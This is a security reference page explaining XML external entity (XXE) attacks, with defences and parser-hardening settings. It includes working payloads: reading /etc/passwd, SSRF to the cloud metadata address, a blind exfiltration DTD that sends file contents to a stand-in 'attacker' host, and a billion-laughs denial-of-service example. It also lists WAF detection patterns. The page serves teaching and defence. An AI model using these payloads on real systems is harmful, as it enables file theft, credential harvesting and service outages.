---
title: XML external entity (XXE)
slug: xxe
---

> **TL;DR:** External entity reference in XML parser exfiltrates files, blind OOB, or SSRF.

## What it is
XML 1.0 lets a document declare external entities — placeholders whose value comes from a URI fetched by the parser. If the parser resolves them and the document is attacker-controlled, that fetch happens with the privileges of the application: read local files, hit internal services (SSRF), trigger denial-of-service via billion-laughs entity expansion. The class survives because many libraries default to "resolve external entities" — XML parsers, SOAP stacks, SVG renderers, DOCX/XLSX (Office Open XML), SAML processors.

## Preconditions / where it applies
- App accepts XML input from a user — REST endpoint, SOAP, SAML response, file upload that internally parses XML (DOCX, SVG, KML, EPUB, RSS)
- Parser configured with external entity resolution on (libxml without `LIBXML_NONET`, Java DocumentBuilder defaults, .NET XmlReader pre-4.5.2 defaults, Python lxml without `resolve_entities=False`)
- Network path from parser to attacker (for OOB) or file-system path for in-band

## Technique
**In-band file read:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>
```

If the response echoes `name`, the file contents appear.

**SSRF:**

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

See [[ssrf-to-cloud]] for credential harvesting downstream.

**Blind OOB exfil** (response doesn't echo). Host an attacker DTD `evil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/x?d=%file;'>">
%eval;
%exfil;
```

Reference it from the request:

```xml
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd"> %dtd;]>
```

File content is appended to the attacker-controlled URL.

**Parameter entities only.** Some parsers reject general external entities but still resolve parameter entities (`%name;`) — the OOB pattern still works.

**Billion laughs / quadratic blow-up DoS:**

```xml
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
...
<!ENTITY lol9 "&lol8;..."> 
<root>&lol9;</root>
```

**Container formats.** XXE inside DOCX (`word/document.xml`), XLSX (`xl/workbook.xml`), SVG inside an image upload, KML in mapping apps, EPUB, SAML responses (see [[parser-differential-saml-ruby]]).

PHP-specific: `php://filter/convert.base64-encode/resource=…` lets you exfil binary that would otherwise break the XML parser when read as `&xxe;`.

## Detection and defence
- Disable external entities in the parser. Java `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`. .NET `XmlReaderSettings.DtdProcessing = Prohibit`. Python `defusedxml`. PHP `libxml_disable_entity_loader(true)` / use `LIBXML_NONET`. libxml `LIBXML_NOENT` *enables* expansion — do not confuse.
- Reject `DOCTYPE` declarations server-side before parsing
- Egress filter the application from internal networks and metadata
- WAF detection: `<!ENTITY`, `SYSTEM`, `file://`, `http://169.254` in XML bodies

## References
- [PortSwigger — XXE](https://portswigger.net/web-security/xxe) — labs, blind exfil
- [OWASP — XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) — per-parser fixes
- [PayloadsAllTheThings — XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) — payload library
